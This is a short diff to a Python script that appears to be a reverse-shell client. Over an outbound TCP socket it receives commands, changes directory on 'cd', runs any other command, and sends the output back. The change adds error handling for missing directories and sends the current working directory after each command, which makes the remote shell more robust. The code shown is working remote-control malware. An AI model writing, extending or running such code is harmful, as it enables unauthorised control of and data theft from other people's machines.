@@ -26,8 +26,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             exit()
         # cd case (change directory and send back cwd)
         if command_to_run[:2] == 'cd':
-            os.chdir(command_to_run[3:])
-            command_output = os.getcwd().encode('utf-8')
+            try:
+                os.chdir(command_to_run[3:])
+                command_output = os.getcwd().encode('utf-8')
+            except FileNotFoundError as error:
+                command_output = str(error).encode('utf-8')
             s.sendall(command_output)
         else:
             # else just run the command
@@ -35,3 +38,6 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             # send output
             command_output = command_output.encode('utf-8')
             s.sendall(command_output)
+        # send current working directory
+        working_directory = os.getcwd()
+        s.sendall(working_directory.encode('utf-8'))
